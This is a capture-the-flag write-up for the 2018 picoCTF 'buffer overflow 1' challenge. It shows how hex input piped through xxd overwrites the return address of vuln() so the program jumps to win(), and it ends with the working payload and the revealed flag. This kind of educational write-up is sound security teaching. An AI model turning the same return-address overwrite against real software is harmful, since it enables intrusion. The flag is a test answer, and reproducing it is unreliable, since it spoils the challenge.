## Writeup for 2018 picoCTF: buffer overflow 1
Binary Exploitation, 200 points

### Problem
> Okay now you're cooking! This time can you overflow the buffer and return to the flag function in this [program] (https://2018shell.picoctf.com/static/64108e53cad29c810b4f6b214d183a8a/vuln)? You can find it in /problems/buffer-overflow-1_2_86cbe4de3cdc8986063c379e61f669ba on the shell server. [Source](https://2018shell.picoctf.com/static/64108e53cad29c810b4f6b214d183a8a/vuln.c).

Our task is to overflow the buffer so that the return address of `vuln()` is changed to that of `win()`.  
Finding the location of `vuln()`'s return address involves some trial and error:  
```
echo "00000000: 6161 6161 6161 6161 6161 6161 6161 6161
      00000010: 6161 6161 6161 6161 6161 6161 6161 6161
      00000020: 1818 1818 1717 1717 1616 1616 1515 1515
      00000030: 1313 1313 1212 1212 1414 1414 1111 1111
      00000040: 1010 1010 0909 0909" | xxd -r | ./vuln
```
Output:  `Okay, time to return... Fingers Crossed... Jumping to 0x15151515`  
Observing the output it's clear that we should replace `1515 1515` with `win()`'s address, which we can find out is `0804 85cb` by `objdump -D vuln | grep win`  
Playing around it seems my machine is in Little Endian. So `cb85 0408` is the correct input, instead of `0804 85cb`.

### Solution:
```
objdump -D vuln | grep win;
echo "00000000: 6161 6161 6161 6161 6161 6161 6161 6161
      00000010: 6161 6161 6161 6161 6161 6161 6161 6161
      00000020: 1818 1818 1717 1717 1616 1616 cb85 0408
      00000030: 1313 1313 1212 1212 1414 1414 1111 1111
      00000040: 1010 1010 0909 0909" | xxd -r | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
picoCTF{addr3ss3s_ar3_3asy56a7b196}Segmentation fault (core dumped)
```
